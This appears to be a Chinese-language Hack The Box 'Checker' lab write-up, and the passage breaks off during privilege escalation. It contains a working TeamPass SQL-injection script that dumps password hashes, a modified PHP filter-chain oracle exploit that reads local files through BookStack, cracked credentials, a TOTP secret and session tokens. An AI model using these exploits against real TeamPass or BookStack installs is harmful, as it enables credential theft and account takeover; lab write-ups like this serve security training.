{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Checker","contentHtml":"<h1>Season7-Checker</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/competitive/7/overview\">https://app.hackthebox.com/competitive/7/overview</a> | <code>hard</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<p>首先将<code>checker.htb</code>添加到<code>hosts</code>文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.56    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:03 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.56\nHost is up (0.21s latency).\nNot shown: 65053 filtered tcp ports (no-response), 479 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 68.70 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -A -T4 -O -p 22,80,8080 10.10.11.56  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.56\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)\n|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)\n80/tcp   open  http    Apache httpd\n|_http-title: 403 Forbidden\n|_http-server-header: Apache\n8080/tcp open  http    Apache httpd\n|_http-server-header: Apache\n|_http-title: 403 Forbidden\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   397.46 ms 10.10.16.1\n2   397.58 ms 10.10.11.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 33.63 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -script=vuln -p 80,8080 10.10.11.56    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:07 EST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nStats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nPORT     STATE SERVICE\n80/tcp   open  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-stored-xss: Couldn'</span>t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 294.05 seconds\n</span></code></pre>\n<p>访问<code>10.10.11.56:8080</code>端口回会加载<code>vault.checker.htb</code>将写入<code>hosts</code>文件</p>\n<p>扫描子域名，无结果（但是其实会返回<code>429</code>，过多的请求，大概率是不要我们去扫描了）</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H <span class=\"hljs-string\">'Host:FUZZ.checker.\nhtb'</span> -u checker.htb                                                                                                                                          \n********************************************************                                                                                                     \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     \n********************************************************                                                                                                     \n                                                                                                                                                             \nTarget: http://checker.htb/                                                                                                                                  \nTotal requests: 4989                                                                                                                                         \n                                                                                                                                                             \n=====================================================================                                                                                        \nID           Response   Lines    Word       Chars       Payload                                                                                              \n=====================================================================                                                                                        \n                                                                              \n                                                                                                                                                             \nTotal <span class=\"hljs-keyword\">time</span>: 0                                                                                                                                                \nProcessed Requests: 4989                                                                                                                                     \nFiltered Requests: 4989                                                                                                                                      \nRequests/sec.: 0                     \n\n⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H <span class=\"hljs-string\">'Host:FUZZ.checker.\nhtb:8080'</span> -u checker.htb:8080           \n********************************************************                                                                                                     \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     \n********************************************************                                                                                                     \n                                                                                                                                                             \nTarget: http://checker.htb:8080/                                                                                                                             \nTotal requests: 4989                                                                                                                                         \n                                                                                                                                                             \n=====================================================================                                                                                        \nID           Response   Lines    Word       Chars       Payload                                                                                              \n=====================================================================          \nTotal <span class=\"hljs-keyword\">time</span>: 0                                                                                                                                                \nProcessed Requests: 4989                                                                                                                                     \nFiltered Requests: 4989                                                                                                                                      \nRequests/sec.: 0                                                                                                                                             \n</code></pre>\n<p>访问<code>HTTP</code>服务，进来就是一个输入框，<code>BookStack</code> 使用 PHP 和 Laravel 构建的创建文档/wiki 内容的平台</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image12.png\" alt=\"image.png\"></p>\n<p>访问<code>8080</code>端口，也是登录框，<code>teampass</code>  协作密码管理器</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image13.png\" alt=\"image.png\"></p>\n<h2>TeamPass 利用</h2>\n<p>经查阅<code>Teampass</code>存在<code>SQL</code>注入漏洞： <a href=\"https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2\">https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2</a></p>\n<p>POC：</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$#</span>\"</span> -lt 1 ]; <span class=\"hljs-keyword\">then</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Usage: <span class=\"hljs-variable\">$0</span> &#x3C;base-url>\"</span>\n  <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n\nvulnerable_url=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>/api/index.php/authorize\"</span>\n\ncheck=$(curl --silent <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$vulnerable_url</span>\"</span>)\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$check</span>\"</span> | grep -q <span class=\"hljs-string\">\"API usage is not allowed\"</span>; <span class=\"hljs-keyword\">then</span>\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"API feature is not enabled :-(\"</span>\n  <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n\n<span class=\"hljs-comment\"># htpasswd -bnBC 10 \"\" h4ck3d | tr -d ':\\n'</span>\narbitrary_hash=<span class=\"hljs-string\">'$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'</span>\n\n<span class=\"hljs-function\"><span class=\"hljs-title\">exec_sql</span></span>() {\n  inject=<span class=\"hljs-string\">\"none' UNION SELECT id, '<span class=\"hljs-variable\">$arbitrary_hash</span>', (<span class=\"hljs-variable\">$1</span>), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin\"</span>\n  data=<span class=\"hljs-string\">\"{\\\"login\\\":\\\"\"</span><span class=\"hljs-variable\">$inject</span>\\\"<span class=\"hljs-string\">\",\\\"password\\\":\\\"h4ck3d\\\", \\\"apikey\\\": \\\"foo\\\"}\"</span>\n  token=$(curl --silent --header <span class=\"hljs-string\">\"Content-Type: application/json\"</span> -X POST --data <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$data</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$vulnerable_url</span>\"</span> | jq -r <span class=\"hljs-string\">'.token'</span>)\n  <span class=\"hljs-built_in\">echo</span> $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$token</span>| <span class=\"hljs-built_in\">cut</span> -d<span class=\"hljs-string\">\".\"</span> -f2 | <span class=\"hljs-built_in\">base64</span> -d 2>/dev/null | jq -r <span class=\"hljs-string\">'.public_key'</span>)\n}\n\n<span class=\"hljs-built_in\">users</span>=$(exec_sql <span class=\"hljs-string\">\"SELECT COUNT(*) FROM teampass_users WHERE pw != ''\"</span>)\n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"There are <span class=\"hljs-variable\">$users</span> users in the system:\"</span>\n\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> `<span class=\"hljs-built_in\">seq</span> 0 $((<span class=\"hljs-variable\">$users</span>-<span class=\"hljs-number\">1</span>))`; <span class=\"hljs-keyword\">do</span>\n  username=$(exec_sql <span class=\"hljs-string\">\"SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT <span class=\"hljs-variable\">$i</span>,1\"</span>)\n  password=$(exec_sql <span class=\"hljs-string\">\"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT <span class=\"hljs-variable\">$i</span>,1\"</span>)\n  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$username</span>: <span class=\"hljs-variable\">$password</span>\"</span>\n<span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p>成功读到用户</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/checker  ./poc.sh checker.htb:8080\nThere are 2 <span class=\"hljs-built_in\">users</span> <span class=\"hljs-keyword\">in</span> the system:\nadmin: $2y$10<span class=\"hljs-variable\">$lKCae0EIUNj6f96ZnLqnC</span>.LbWqrBQCT1LuHEFht6PmE4yH75rpWya\nbob: $2y$10<span class=\"hljs-variable\">$yMypIj1keU</span>.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy\n</code></pre>\n<p>使用<code>john</code>爆破，得到<code>bob</code>密码<code>cheerleader</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/checker  john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\ncheerleader      (?)     \n</code></pre>\n<p>登陆后台，成功进入</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image14.png\" alt=\"image.png\"></p>\n<p>还可以找到<code>BookStack</code>的账号密码 <code>bob@checker.htb</code> : <code>mYSeCr3T_w1kI_P4sSw0rD</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image15.png\" alt=\"image.png\"></p>\n<p>还可以找到<code>SSH</code>的账号密码 <code>reader</code> : <code>hiccup-publicly-genesis</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image16.png\" alt=\"image.png\"></p>\n<p>登录<code>SSH</code> ，输入密码后还要输入<code>Verification code</code> (<code>MFA</code> 双因子认证登录)</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image17.png\" alt=\"image.png\"></p>\n<h2>BookStack</h2>\n<p>拿到<code>bob</code>用户凭据登录<code>BookStack</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image18.png\" alt=\"image.png\"></p>\n<p>试了一下<code>BookStack</code> 添加书籍时插入代码，但是不成功</p>\n<p>到<code>BookStack</code>的官网下找文档，发现里面有<code>MFA</code>认证，可能是和<code>header</code>的有关</p>\n<p><a href=\"https://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication\">https://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication</a></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image19.png\" alt=\"image.png\"></p>\n<p>在个人界面里面也能找到 <code>Setup Multi-Factor Authentication</code> 选项</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image20.png\" alt=\"image.png\"></p>\n<p>底下的的<code>Backup Codes</code> （将以下代码列表存储在安全的地方。访问系统时，您将能够将其中一个代码用作第二个身份验证机制）但是在我使用脚本尝试了很多次之后都无法进入，拼尽全力无法战胜（香蕉猫）</p>\n<p>继续进行信息收集，在<code>admin</code>写的<code>Linux-security</code>发现一个路径<code>/backup/home_backup</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image21.png\" alt=\"image.png\"></p>\n<p>找到一个SSRF漏洞：<a href=\"https://fluidattacks.com/advisories/imagination/\">https://fluidattacks.com/advisories/imagination/</a> | <a href=\"https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/\">https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/</a></p>\n<blockquote>\n<p>A server-side request forgery (SSRF) vulnerability has been identified in Book Stack that, under certain conditions, could allow an attacker to obtain local files from the server. The attacker must have writer permissions. | 某些条件下攻击者可以获取本地文件</p>\n</blockquote>\n<p>根据漏洞报告可以找到利用工具：<a href=\"https://github.com/synacktiv/php_filter_chains_oracle_exploit\">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>\n<p>读取的文件是：<code>/backup/home_backup/home/reader/.google_authenticator</code></p>\n<blockquote>\n<p>这个文件包含了与 Google Authenticator 相关的密钥和配置信息。每个用户在启用 2FA 时，Google Authenticator 会生成一个密钥，并将其保存到 <code>.google_authenticator</code> 文件中。这个密钥是用来生成 TOTP 的核心数据</p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">// POC\npython filters_chain_oracle_exploit.py \\\n  --target <span class=\"hljs-string\">\"http://checker.htb/ajax/page/12/save-draft\"</span> \\\n  --file <span class=\"hljs-string\">\"/backup/home_backup/home/reader/.google_authenticator\"</span> \\\n  --parameter <span class=\"hljs-string\">\"html\"</span> \\\n  --verb PUT \\\n  --headers <span class=\"hljs-string\">\"{\\\"X-CSRF-TOKEN\\\": \\\"<span class=\"hljs-variable\">$CSRF</span>-TOKEN\\\", \\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\", \\\"Cookie\\\": \\\"jstree_select=1; XSRF-TOKEN=<span class=\"hljs-variable\">$XSRF</span>-TOKEN; bookstack_session=<span class=\"hljs-variable\">$BookStack</span>\\\"}\"</span>\n</code></pre>\n<p>我们新建书本添加新页面后点击保存的包即可获得上面所需所有参数</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image22.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image23.png\" alt=\"image.png\"></p>\n<p>使用工具前需要替换新的<code>php_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py</code>文件，不然很容易出现错误</p>\n<pre><code class=\"hljs language-bash\">// new requestor.py\nimport json\nimport requests\nimport <span class=\"hljs-keyword\">time</span>\nimport <span class=\"hljs-built_in\">base64</span>  <span class=\"hljs-comment\"># Ensure base64 module is imported</span>\nfrom filters_chain_oracle.core.verb import Verb\nfrom filters_chain_oracle.core.utils import merge_dicts\nimport re\n\n<span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\nClass Requestor, defines all the request logic.\n\"</span><span class=\"hljs-string\">\"\"</span>\nclass Requestor:\n    def __init__(self, file_to_leak, target, parameter, data=<span class=\"hljs-string\">\"{}\"</span>, headers=<span class=\"hljs-string\">\"{}\"</span>, verb=Verb.POST, in_chain=<span class=\"hljs-string\">\"\"</span>, proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):\n        self.file_to_leak = file_to_leak\n        self.target = target\n        self.parameter = parameter\n        self.headers = headers\n        self.verb = verb\n        self.json_input = json_input\n        self.match = match\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] The following URL is targeted : {}\"</span>.format(self.target))\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] The following local file is leaked : {}\"</span>.format(self.file_to_leak))\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] Running {} requests\"</span>.format(self.verb.name))\n        <span class=\"hljs-keyword\">if</span> data != <span class=\"hljs-string\">\"{}\"</span>:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] Additionnal data used : {}\"</span>.format(data))\n        <span class=\"hljs-keyword\">if</span> headers != <span class=\"hljs-string\">\"{}\"</span>:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] Additionnal headers used : {}\"</span>.format(headers))\n        <span class=\"hljs-keyword\">if</span> in_chain != <span class=\"hljs-string\">\"\"</span>:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] The following chain will be in each request : {}\"</span>.format(in_chain))\n            in_chain = <span class=\"hljs-string\">\"|convert.iconv.{}\"</span>.format(in_chain)\n        <span class=\"hljs-keyword\">if</span> match:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] The following pattern will be matched for the oracle : {}\"</span>.format(match))\n        self.in_chain = in_chain\n        self.data = json.loads(data)\n        self.headers = json.loads(headers)\n        self.delay = <span class=\"hljs-built_in\">float</span>(delay)\n        <span class=\"hljs-keyword\">if</span> proxy :\n            self.proxies = {\n                <span class=\"hljs-string\">'http'</span>: f<span class=\"hljs-string\">'{proxy}'</span>,\n                <span class=\"hljs-string\">'https'</span>: f<span class=\"hljs-string\">'{proxy}'</span>,\n            }\n        <span class=\"hljs-keyword\">else</span>:\n            self.proxies = None\n        self.instantiate_session()\n        <span class=\"hljs-keyword\">if</span> time_based_attack:\n            self.time_based_attack = self.error_handling_duration()\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[+] Error handling duration : {}\"</span>.format(self.time_based_attack))\n        <span class=\"hljs-keyword\">else</span>:\n            self.time_based_attack = False\n        \n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n    Instantiates a requests session for optimization\n    \"</span><span class=\"hljs-string\">\"\"</span>\n    def instantiate_session(self):\n        self.session = requests.Session()\n        self.session.headers.update(self.headers)\n        self.session.proxies = self.proxies\n        self.session.verify = False\n\n    def <span class=\"hljs-built_in\">join</span>(self, *x):\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">'|'</span>.<span class=\"hljs-built_in\">join</span>(x)\n\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n    Used to see how much time a 500 error takes to calibrate the timing attack\n    \"</span><span class=\"hljs-string\">\"\"</span>\n    def error_handling_duration(self):\n        chain = <span class=\"hljs-string\">\"convert.base64-encode\"</span>\n        requ = self.req_with_response(chain)\n        self.normal_response_time = requ.elapsed.total_seconds()\n        self.blow_up_utf32 = <span class=\"hljs-string\">'convert.iconv.L1.UCS-4'</span>\n        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)\n        chain_triggering_error = f<span class=\"hljs-string\">\"convert.base64-encode|{self.blow_up_inf}\"</span>\n        requ = self.req_with_response(chain_triggering_error)\n        <span class=\"hljs-built_in\">return</span> requ.elapsed.total_seconds() - self.normal_response_time\n\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n    Used to parse the option parameter sent by the user\n    \"</span><span class=\"hljs-string\">\"\"</span>\n    def parse_parameter(self, filter_chain):\n        data = {}\n        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">'['</span> and <span class=\"hljs-string\">']'</span> <span class=\"hljs-keyword\">in</span> self.parameter: <span class=\"hljs-comment\"># Parse array elements</span>\n            \n            main_parameter = [re.search(r<span class=\"hljs-string\">'^(.*?)\\['</span>, self.parameter).group(1)]\n            sub_parameters = re.findall(r<span class=\"hljs-string\">'\\[(.*?)\\]'</span>, self.parameter)\n            all_params = main_parameter + sub_parameters\n            json_object = {}\n            temp = json_object\n            <span class=\"hljs-keyword\">for</span> i, element <span class=\"hljs-keyword\">in</span> enumerate(all_params):\n                <span class=\"hljs-keyword\">if</span> i == len(all_params) -1:\n                    temp[element] = filter_chain\n                <span class=\"hljs-keyword\">else</span>:\n                    temp[element] = {}\n                    temp = temp[element]\n            data = json_object\n        <span class=\"hljs-keyword\">else</span>:\n            data[self.parameter] = filter_chain\n        <span class=\"hljs-built_in\">return</span> merge_dicts(data, self.data)\n\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n    Returns the response of a request defined with all options\n    \"</span><span class=\"hljs-string\">\"\"</span>\n    def req_with_response(self, s):\n        <span class=\"hljs-keyword\">if</span> self.delay > 0:\n            time.sleep(self.delay)\n\n        filter_chain = f<span class=\"hljs-string\">'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'</span>\n        <span class=\"hljs-comment\"># DEBUG print(filter_chain)</span>\n        merged_data = self.parse_parameter(filter_chain)\n\n        <span class=\"hljs-comment\"># Fix indentation: Encode filter chain in Base64</span>\n        encoded_bytes = base64.b64encode(filter_chain.encode(<span class=\"hljs-string\">'utf-8'</span>))\n        encoded_str = encoded_bytes.decode(<span class=\"hljs-string\">'utf-8'</span>)\n        payload = f<span class=\"hljs-string\">\"&#x3C;img src='data:image/png;base64,{encoded_str}'/>\"</span>\n        merged_data[self.parameter] = payload  <span class=\"hljs-comment\"># Fixed indentation</span>\n\n        <span class=\"hljs-comment\"># Make the request, the verb and data encoding is defined</span>\n        try:\n            <span class=\"hljs-keyword\">if</span> self.verb == Verb.GET:\n                requ = self.session.get(self.target, params=merged_data)\n                <span class=\"hljs-built_in\">return</span> requ\n            <span class=\"hljs-keyword\">elif</span> self.verb == Verb.PUT:\n                <span class=\"hljs-keyword\">if</span> self.json_input: \n                    requ = self.session.put(self.target, json=merged_data)\n                <span class=\"hljs-keyword\">else</span>:\n                    requ = self.session.put(self.target, data=merged_data)\n                <span class=\"hljs-built_in\">return</span> requ\n            <span class=\"hljs-keyword\">elif</span> self.verb == Verb.DELETE:\n                <span class=\"hljs-keyword\">if</span> self.json_input:\n                    requ = self.session.delete(self.target, json=merged_data)\n                <span class=\"hljs-keyword\">else</span>:\n                    requ = self.session.delete(self.target, data=merged_data)\n                <span class=\"hljs-built_in\">return</span> requ\n            <span class=\"hljs-keyword\">elif</span> self.verb == Verb.POST:\n                <span class=\"hljs-keyword\">if</span> self.json_input:\n                    requ = self.session.post(self.target, json=merged_data)\n                <span class=\"hljs-keyword\">else</span>:\n                    requ = self.session.post(self.target, data=merged_data)\n                <span class=\"hljs-built_in\">return</span> requ\n        except requests.exceptions.ConnectionError :\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[-] Could not instantiate a connection\"</span>)\n            <span class=\"hljs-built_in\">exit</span>(1)\n        <span class=\"hljs-built_in\">return</span> None\n\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n    Used to determine if the answer trigged the error based oracle\n    TODO : increase the efficiency of the time based oracle\n    \"</span><span class=\"hljs-string\">\"\"</span>\n    def error_oracle(self, s):\n        requ = self.req_with_response(s)\n\n        <span class=\"hljs-keyword\">if</span> self.match:\n            <span class=\"hljs-comment\"># DEBUG print(\"PATT\", (self.match in requ.text))</span>\n            <span class=\"hljs-built_in\">return</span> self.match <span class=\"hljs-keyword\">in</span> requ.text \n\n        <span class=\"hljs-keyword\">if</span> self.time_based_attack:\n            <span class=\"hljs-comment\"># DEBUG print(\"ELAP\", requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01))</span>\n            <span class=\"hljs-built_in\">return</span> requ.elapsed.total_seconds() > ((self.time_based_attack/<span class=\"hljs-number\">2</span>)+<span class=\"hljs-number\">0.01</span>)\n        \n        # DEBUG print(\"CODE\", requ.status_code == <span class=\"hljs-number\">500</span>)\n        return requ.status_code == <span class=\"hljs-number\">500</span>\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">python filters_chain_oracle_exploit.py \\\n  --target <span class=\"hljs-string\">\"http://checker.htb/ajax/page/12/save-draft\"</span> \\\n  --file <span class=\"hljs-string\">\"/backup/home_backup/home/reader/.google_authenticator\"</span> \\\n  --parameter <span class=\"hljs-string\">\"html\"</span> \\\n  --verb PUT \\\n  --headers <span class=\"hljs-string\">\"{\\\"X-CSRF-TOKEN\\\": \\\"W2b1WrEWyjBm6Trtww9aTPmoS9ZBqZejPACNmTT5\\\", \\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\", \\\"Cookie\\\": \\\"jstree_select=1; XSRF-TOKEN=eyJpdiI6InRMa3VVTzZTa2EzWDVFRFQzaEFlSkE9PSIsInZhbHVlIjoiUFFvT2IxeDR2U3FKMndxenlmRmwwTWYyUlJNbXVscnRrUGFtZkdzM2hjKzlsU1U0ZjdOUkVRMkI2U1FKYmpqMFNDTnVHdVNFYzR1TXhDN1A5dFdlUHVBK05UZUhweWtyMHRKUVFHbVZUd05Lays5VklZS3JtbjByNWJqVEk0QTAiLCJtYWMiOiI1Y2Y5OWMwNGRkOTVlODQ4ZjI0YWYxNDBlMWM0MmM4MmE1YjdkYWI1YmY0NzUzMmVlNWRhZjI2MDZlYWI5ZWQwIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6Ild0Um4wek9DVzlZYU55WEZpZUFqK0E9PSIsInZhbHVlIjoiQlFYMXZic1NQUXBtVG1IRXFvb1R3dkFsTTJyQW5meUZuUi9QbUd0Lzdtb2RXS2VGOUpFQUhHVXFmRGlBRW9iNG1SUEttTVlYZzF6NzJiVGxicFp5L09qVUdGQmp4UEFqaUFTZWt5VkZpS0I3UE1URHcrNkZML2FlUy9JQW82cXIiLCJtYWMiOiJiMTBmMWQzNzVjNTYwNDMyYWFlMTU1YzNlNTRmYzJhYjk0NTllMDUzODgxYTRjY2RhMmJmNzVkMzJmMDUxZDhkIiwidGFnIjoiIn0%3D\\\"}\"</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Checker/image24.png\" alt=\"image.png\"></p>\n<p>最终读出来是：<code>DVDBRAODLCWF7I2ONA4K5LQLUE</code> ，并使用<a href=\"https://it-tools.tech/otp-generator\">https://it-tools.tech/otp-generator</a> 来获取验证码</p>\n<p>登录<code>SSH</code>，得使用美国或者欧洲节点，不然会出现 <code>Error \"Operation Not Permitted\"</code> 是时间同步问题，但是通过<code>date --set \"$(curl -is 10.10.11.56 | grep Date | awk -F 'Date:' '{print $2}')\"</code> 也无法登录成功</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/checker/php_filter_chains_oracle_exploit  ssh reader@checker.htb\n(reader@checker.htb) Password: // hiccup-publicly-genesis\n(reader@checker.htb) Verification code: // code\nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that <span class=\"hljs-built_in\">users</span> <span class=\"hljs-keyword\">do</span> not <span class=\"hljs-built_in\">log</span> into.\n\nTo restore this content, you can run the <span class=\"hljs-string\">'unminimize'</span> <span class=\"hljs-built_in\">command</span>.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nLast login: Tue Feb 25 15:23:52 2025 from 10.10.16.57\nreader@checker:~$ \n\n</code></pre>\n<p>读取<code>.google_authenticator</code></p>\n<pre><code class=\"hljs language-bash\">reader@checker:~$ <span class=\"hljs-built_in\">cat</span> .google_authenticator \nDVDBRAODLCWF7I2ONA4K5LQLUE\n<span class=\"hljs-string\">\" TOTP_AUTH\n</span></code></pre>\n<p>读取用户<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">reader@checker:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n13a819d80cf8119xxxxxxxxxxxxxxx\n</code></pre>\n<h2>信息收集</h2>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">reader@checker:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> reader on checker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n/2\nUser reader may run the following commands on checker:\n    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *\n</code></pre>\n<pre><code class=\"hljs language-bash\">reader@checker:/opt/hash-checker$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 